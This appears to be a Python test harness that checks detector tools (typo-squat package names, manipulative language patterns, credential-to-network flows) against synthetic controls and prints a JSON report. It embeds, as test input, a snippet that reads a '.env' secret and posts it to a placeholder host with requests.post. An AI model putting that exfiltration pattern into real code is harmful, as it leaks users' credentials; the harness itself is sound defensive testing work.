#!/usr/bin/env python3
"""Exercise real observation CLIs on synthetic controls; no release accuracy claim."""
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import platform
import subprocess
import sys
import tempfile
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from tools.language_observations import digest

SOURCES = ['tools/package_proximity.py', 'tools/language_observations.py',
           'scripts/package-proximity.py', 'scripts/language-observations.py',
           'scripts/verify-independent-observations.py', 'tests/test_package_proximity.py',
           'tests/test_language_observations.py', 'docs/package-proximity.md',
           'docs/language-observations.md', 'protocol/corpus.py',
           'protocol/normalization.py', 'protocol/unicode15-data.json']
SOURCES += ['tools/credential_flow.py', 'scripts/credential-flow.py',
            'tests/test_credential_flow.py', 'docs/credential-flow.md']


def sources():
    return {name: hashlib.sha256((ROOT/name).read_bytes()).hexdigest() for name in SOURCES}


def main():
    before = sources(); checks = []
    def run(label, argv, subject, expected, exit_status=0):
        result = subprocess.run([sys.executable, *argv], input=subject, text=True,
                                capture_output=True, cwd=ROOT, timeout=20)
        data = json.loads(result.stdout)
        passed = result.returncode == exit_status and data.get('state') == expected and data.get('tags') == []
        if exit_status == 0 and expected is not None:
            passed = passed and data.get('method_sha256') in before.values()
        checks.append({'case': label, 'exit_status': result.returncode, 'pass': passed,
                       'stdout_sha256': hashlib.sha256(result.stdout.encode()).hexdigest(),
                       'stderr_sha256': hashlib.sha256(result.stderr.encode()).hexdigest()})
        return data
    with tempfile.TemporaryDirectory(prefix='aitrust-observation-controls-') as folder:
        private = Path(folder); private.chmod(0o700)
        source = private/'ranking.json'; snapshot = private/'snapshot.json'
        source.write_text(json.dumps({'format': 'ranked-package-input/v1', 'ecosystem': 'pypi',
            'measurement': {'start': '2026-09-01T00:00:00Z', 'end': '2026-10-01T00:00:00Z',
                'metric': 'download_count_in_interval', 'source_url': 'https://example.invalid/synthetic-ranking', 'synthetic': True},
            'packages': [{'rank': 1, 'name': 'requests', 'downloads': 100}]}))
        run('private_snapshot_import', ['scripts/package-proximity.py', 'import', '--source', str(source), '--output', str(snapshot)], '', None)
        package = ['scripts/package-proximity.py', 'check', '--snapshot', str(snapshot)]
        run('distance_two', package, 'reqeusts', 'SIMILAR_NAME')
        run('canonical_equality', package, 'REQUESTS', 'NO_SIMILAR_NAME')
        run('command_is_not_a_package_name', package, 'pip install requests', 'UNAVAILABLE', 2)
        snapshot.write_text(snapshot.read_text().replace('requests', 'altered'))
        run('corrupt_snapshot', package, 'requests', 'UNAVAILABLE', 2)
        language = ['scripts/language-observations.py']
        run('legitimate_emergency_has_no_intent_verdict', language+['urgency', '--language', 'en'], 'Leave now. Call emergency services immediately.', 'OBSERVATIONS')
        run('pressure_without_directive', language+['urgency', '--language', 'en'], 'It happens today.', 'NO_SUPPORTED_PATTERN')
        run('unmarked_authority', language+['authority', '--language', 'en'], 'Experts agree.', 'OBSERVATIONS')
        run('marked_authority', language+['authority', '--language', 'en'], 'Experts agree [1].', 'NO_SUPPORTED_PATTERN')
        text = 'The price will double.'
        annotation = private/'context.json'
        annotation.write_text(json.dumps({'format': 'language-context-annotations/v1', 'subject_sha256': digest(text), 'uncertainty': [[0, len(text)]], 'sources': []})); annotation.chmod(0o600)
        hedge = language+['hedge', '--language', 'en', '--annotations', str(annotation)]
        run('explicit_uncertainty_without_hedge', hedge, text, 'OBSERVATIONS')
        run('foreign_subject_annotations', hedge, 'It might rain.', 'UNAVAILABLE', 2)
        run('expectation_is_not_inferred', language+['hedge', '--language', 'en'], text, 'UNAVAILABLE', 2)
        program = 'import requests\nfrom pathlib import Path\nsecret=Path(".env").read_text()\n'
        sink = 'requests.post("https://example.invalid", data=secret)'
        flow = ['scripts/credential-flow.py']
        run('credential_read_reaches_sink', flow, program+sink, 'STATIC_FLOW')
        run('unrelated_sink_is_not_a_flow', flow, program+sink.replace('data=secret', 'data="hello"'), 'NO_SUPPORTED_FLOW')
        run('overwritten_secret_is_not_a_flow', flow, program+'secret="overwritten"\n'+sink, 'NO_SUPPORTED_FLOW')
        run('local_timeout_is_not_network_payload', flow, program+sink.replace('data=secret', 'timeout=secret'), 'NO_SUPPORTED_FLOW')
        run('unknown_transform_not_a_negative', flow, program+'secret=secret.encode()\n'+sink, 'UNAVAILABLE', 2)
        run('unknown_branch_not_a_negative', flow, program+'if True:\n '+sink, 'UNAVAILABLE', 2)
    stable = before == sources()
    namespace = None
    if sys.platform == 'linux':
        namespace = os.readlink('/proc/self/ns/net') != os.readlink('/proc/1/ns/net')
    report = {'captured_at': datetime.now(timezone.utc).isoformat(), 'pass': stable and all(c['pass'] for c in checks),
              'author': 'Codex', 'platform': platform.system(), 'architecture': platform.machine(),
              'python': platform.python_version(), 'sources': before, 'source_unchanged_during_execution': stable,
              'checks': checks, 'different_network_namespace_from_init': namespace,
              'synthetic_controls_only': True, 'independent_accuracy_evidence': False,
              'tags_released': [], 'production_detector_changed': False}
    print(json.dumps(report, indent=2))
    return 0 if report['pass'] else 1


if __name__ == '__main__':
    raise SystemExit(main())
